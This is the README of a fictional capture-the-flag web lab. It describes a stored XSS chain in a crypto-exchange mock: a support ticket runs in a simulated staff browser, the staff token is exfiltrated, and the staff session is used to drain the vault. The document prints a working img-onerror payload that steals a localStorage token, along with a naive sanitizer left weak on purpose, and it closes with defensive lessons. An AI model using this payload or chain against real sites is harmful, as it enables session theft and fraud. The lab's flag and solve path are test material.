# Binanse (r05) — Stored XSS (Hard, Inquisitor only)

Binanse is a fictional crypto exchange with a dark, modern UI (custom geometric mark, inline SVG/CSS only, no external
assets). The vulnerability is a stored cross-site-scripting chain that starts in the support-ticket queue and ends at the
cold-ledger vault. At start the app reads the one-shot flag file (`HVWA_FLAG_FILE`, default `/tmp/.hvwa-flag`), unlinks
it and holds it in memory; it is rendered once, in the transfer receipt, and nowhere else. The flag is never in the
environment, a log, a hint or a page reachable before the drain. Placement is `custom` (an in-memory receipt).

**Author note.** This is a fictional, educational lab inspired by the DevOps-session / hot-wallet incident class: a
support or marketing message is rendered in a privileged operator's browser, and the operator's own session token is
exfiltrated. Binanse is **not affiliated with Binance** and uses none of its name, logo or assets; the coin, the mark and
the exchange are inventions. There is no real funds, no real keys, and no Divine reference level — the lab is
Inquisitor-only, so the exploit must actually work.

## The chain (this is the whole challenge)

1. **Stored XSS in a support ticket.** A signed-in user creates a ticket (`subject`, `body`); the body is stored raw.
   The user's own ticket view (and every other player-facing page) escapes it, so the payload does nothing for the user.
2. **The simulated staff browser.** The "Request staff review" action runs the ticket body in `app/bot.mjs` — a
   simulated DevOps browser with `node:vm`. It sanitizes the body by stripping `<script>…</script>` and `javascript:`
   (a naive sanitizer; event-handler payloads survive), then extracts every `on<event>=` attribute and executes it in a
   context that holds the DevOps access token in `localStorage.getItem('bn_staff_token')` and can `fetch` the app as the
   engineer (relative URLs only, prefixed with `http://127.0.0.1:$HVWA_PORT`, `Cookie: bn_staff=<token>`, 2 s timeout).
   `vm.createContext(..., { codeGeneration: { strings: false, wasm: false } })` disables `eval`/`new Function`/WASM so a
   payload cannot reach Node, and the context exposes only `document` (`cookie: 'bn_theme=dark'`, no token),
   `localStorage`, `fetch`, an `Image` class whose `src` setter fetches, `location` and a silent `console` — never
   `require`, `process`, `fs`, the flag or any Node object.
3. **The supported vector.** `POST /api/attacker/inbox` is public (plain-text body ≤ 4 KiB) and stores entries; the
   signed-in `/attacker` "research log" shows them escaped, with `data-testid="inbox"` / `data-inbox-entry`. The
   reference payload is:
   ```html
   <img src=x onerror="fetch('/api/attacker/inbox',{method:'POST',headers:{'content-type':'text/plain'},body:localStorage.getItem('bn_staff_token')})">
   ```
4. **Staff login with the stolen token.** `GET/POST /staff/login` accepts the token and sets an HttpOnly `bn_staff`
   cookie; the `/staff` console requires it and shows "Signed in as devops", the hot-wallet balances (BTC/ETH/USDT) and
   links to settings/whitelist/transfer. No token → redirect to `/staff/login`.
5. **Two-turn vault.** `/staff/settings` shows a random 6-digit withdrawal PIN in `data-pin="……"` (masked on screen).
   `POST /staff/whitelist` adds a destination address (format `bn1…`). `POST /staff/transfer` requires the destination
   to be whitelisted, the exact PIN, and an amount equal to the whole vault balance; on success the vault goes to zero,
   the destination (the player's own wallet) is credited, and the receipt (`data-testid="receipt"`) contains the flag.

## Reference solve

`solve/inquisitor.mjs` is a complete HTTP client with a small manual cookie jar (Node `fetch` has none) and hand-rolled
303 redirect handling: register a fresh user → read `/dashboard` for the wallet address → create the ticket with the
payload above → request staff review → read `/attacker` and extract the token → `/staff/login` with it → read the PIN
from `/staff/settings` → whitelist the wallet → transfer all → print only `HVWA{...}`. On any refusal it exits 0
silently, like the other reference solves.

## Defensive lessons

- **Output encoding.** Escape untrusted content in every rendering context. Storing a body raw is fine if every sink
  encodes it; the bug here is a downstream sink (the staff browser) that re-renders it unsanitized.
- **CSP.** A strict Content-Security-Policy that disallows inline event handlers and inline scripts would have killed
  the `<img onerror>` vector outright.
- **The localStorage trade-off.** Holding a session token in `localStorage` instead of an HttpOnly cookie means any
  script that runs in the same origin can read it. HttpOnly cookies can still be *used* by the browser (here the bot
  attaches `bn_staff`) but cannot be read back by script.
- **Session binding.** The staff session is a bare token; binding it to a device, an IP/ASN, or requiring a re-auth
  (2FA) for privileged actions would blunt a stolen-token replay.
- **Least privilege.** A support-review browser should never share the same origin/session as the cold-ledger console.
- **Separation of approval.** The vault already wants two factors (whitelist + PIN), but both live behind the one stolen
  session. A real design would put the whitelist and the transfer behind separate operators/approvals, and require a
  second factor the browser cannot read.

## Files

`app/server.mjs` (routing, in-memory state, flag), `app/bot.mjs` (simulated staff browser), `app/render.mjs` (escaped
HTML/CSS, all pages), the Dockerfile `HEALTHCHECK` (BusyBox `wget` on `/healthz`), `seed/market.json` (market table), `solve/inquisitor.mjs`.
Node standard library only (`node:http`, `node:crypto`, `node:fs`, `node:vm`); no npm install, no package.json in the
image, read-only rootfs, state in memory, `/tmp` a tmpfs.
